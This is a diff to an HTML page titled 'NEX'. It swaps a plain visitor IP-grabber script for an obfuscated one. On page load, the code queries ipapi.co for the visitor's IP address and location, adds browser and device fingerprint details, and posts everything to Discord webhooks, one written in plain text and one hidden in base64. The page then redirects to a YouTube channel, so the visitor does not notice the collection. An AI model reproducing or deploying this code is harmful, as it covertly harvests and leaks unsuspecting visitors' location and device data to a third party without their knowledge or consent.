@@ -4,48 +4,9 @@
     <meta charset="UTF-8">
     <title>NEX</title>
     <script>
-        fetch("https://ipapi.co/json/")
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                
-                const fullContent = `
-                    HIT: 
-                        IP Address: ${ip}, 
-                        Network: ${data.network}, 
-                        Version: ${data.version}, 
-                        City: ${data.city}, 
-                        Region: ${data.region}, 
-                        Region Code: ${data.region_code}, 
-                        Country: ${data.country_name}, 
-                        Country Code: ${data.country_code}, 
-                        Country Code ISO3: ${data.country_code_iso3}, 
-                        Country Capital: ${data.country_capital}, 
-                        Country TLD: ${data.country_tld}, 
-                        Continent Code: ${data.continent_code}, 
-                        In EU: ${data.in_eu ? 'true' : 'false'}, 
-                        Latitude: ${data.latitude}, 
-                        Longitude: ${data.longitude}, 
-                        Timezone: ${data.timezone}, 
-                        UTC Offset: ${data.utc_offset}, 
-                        ASN: ${data.asn}, 
-                        Org: ${data.org}
-                        @everyone`;
-                
-                fetch("https://discord.com/api/webhooks/1418505457143644221/y7bsW63LSPUDNQzSwX5LgLHydxorxk30h-PQroxDP_hmpNbbXiW0aCsMBv54GurTivU6",
-                    {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            "content": fullContent
-                        })
-                    }
-                );
-            });
-        
+      const _0x231739=_0x3864;function _0x3864(_0x812c26,_0x1babf1){const _0xa6fbf4=_0xa6fb();return _0x3864=function(_0x386457,_0x1e8286){_0x386457=_0x386457-0x11b;let _0x393b23=_0xa6fbf4[_0x386457];return _0x393b23;},_0x3864(_0x812c26,_0x1babf1);}function _0xa6fb(){const _0x3c96c1=['4958440ujcSNZ','city','https://ipapi.co/json/','66780jGskKA',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Org:\x20','\x20MB,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@everyone','height',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20User\x20Agent:\x20','org','211570OdLVtp',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Device\x20Memory:\x20','toFixed','2936345TjWjHR','578530DPEsXF',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Language:\x20','latitude','27cuQYDZ',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Network:\x20',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Region:\x20',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20##\x20NAVIGATOR\x20INFO:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Screen\x20Resolution:\x20','platform','timezone','N/A',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Latitude:\x20',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ASN:\x20','8dqTjEE','5OBTUIF','network','2763324TqbzRk','json','storageEstimates','utc_offset','then',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Cache\x20Storage\x20Size:\x20',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Version:\x20','deviceMemory','width',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Hardware\x20Concurrency:\x20','version','\x20GB','region',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Timezone:\x20','10219gMBPam',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Region\x20Code:\x20','hardwareConcurrency','language','POST','5172rRGzoW',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Platform:\x20','quota','application/json',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Longitude:\x20',',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20UTC\x20Offset:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20HIT:\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20##\x20IP\x20INFO:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20IP\x20Address:\x20','70ukCROm'];_0xa6fb=function(){return _0x3c96c1;};return _0xa6fb();}(function(_0x5ba469,_0x578bd5){const _0x3bb797=_0x3864,_0x2928d5=_0x5ba469();while(!![]){try{const _0xc7a9e2=parseInt(_0x3bb797(0x12c))/0x1*(parseInt(_0x3bb797(0x11b))/0x2)+-parseInt(_0x3bb797(0x12e))/0x3+-parseInt(_0x3bb797(0x12b))/0x4*(-parseInt(_0x3bb797(0x11e))/0x5)+parseInt(_0x3bb797(0x14c))/0x6*(-parseInt(_0x3bb797(0x148))/0x7)+parseInt(_0x3bb797(0x149))/0x8+-parseInt(_0x3bb797(0x122))/0x9*(parseInt(_0x3bb797(0x11f))/0xa)+-parseInt(_0x3bb797(0x13c))/0xb*(parseInt(_0x3bb797(0x141))/0xc);if(_0xc7a9e2===_0x578bd5)break;else _0x2928d5['push'](_0x2928d5['shift']());}catch(_0xacda2d){_0x2928d5['push'](_0x2928d5['shift']());}}}(_0xa6fb,0xaf066),fetch(_0x231739(0x14b))[_0x231739(0x132)](_0x15c084=>_0x15c084[_0x231739(0x12f)]())[_0x231739(0x132)](_0x3241d7=>{const _0x114e16=_0x231739,_0x39691e=_0x3241d7['ip'];let _0x395160=_0x114e16(0x128);if(navigator[_0x114e16(0x135)]){const _0x4cc175=navigator[_0x114e16(0x135)][_0x114e16(0x11d)](0x2);_0x395160=_0x4cc175+_0x114e16(0x139);}const _0x99ee4a=_0x114e16(0x147)+_0x39691e+_0x114e16(0x123)+_0x3241d7[_0x114e16(0x12d)]+_0x114e16(0x134)+_0x3241d7[_0x114e16(0x138)]+',\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20City:\x20'+_0x3241d7[_0x114e16(0x14a)]+_0x114e16(0x124)+_0x3241d7[_0x114e16(0x13a)]+_0x114e16(0x13d)+_0x3241d7['region_code']+_0x114e16(0x129)+_0x3241d7[_0x114e16(0x121)]+_0x114e16(0x145)+_0x3241d7['longitude']+_0x114e16(0x13b)+_0x3241d7[_0x114e16(0x127)]+_0x114e16(0x146)+_0x3241d7[_0x114e16(0x131)]+_0x114e16(0x12a)+_0x3241d7['asn']+_0x114e16(0x14d)+_0x3241d7[_0x114e16(0x151)]+_0x114e16(0x125)+screen[_0x114e16(0x136)]+'x'+screen[_0x114e16(0x14f)]+_0x114e16(0x150)+navigator['userAgent']+_0x114e16(0x142)+navigator[_0x114e16(0x126)]+_0x114e16(0x120)+navigator[_0x114e16(0x13f)]+',\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Max\x20Touch\x20Points:\x20'+(navigator['maxTouchPoints']||'N/A')+_0x114e16(0x11c)+_0x395160+_0x114e16(0x137)+(navigator[_0x114e16(0x13e)]||_0x114e16(0x128))+_0x114e16(0x133)+(navigator[_0x114e16(0x130)]?navigator[_0x114e16(0x130)][_0x114e16(0x143)]:'N/A')+_0x114e16(0x14e);fetch(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxOTAxMDkwMTQzNjE0MTY3Mi85LVVEWGk4dlFSaE9CRWV4Y1oyZE5jQ3pkejhZdGtGNXlDN0k3SnlyT3lZRHhEMDZyR2R3eHNocWwxb09uSFE3Q2k3cQ=='),{'method':_0x114e16(0x140),'headers':{'Content-Type':_0x114e16(0x144)},'body':JSON['stringify']({'content':_0x99ee4a})});}));
+        setTimeout(function() { window.location = "https://www.youtube.com/@PipkinPippa" }, 1000)
     </script>
 </head>
-
-            
+<body></body>
+</html>
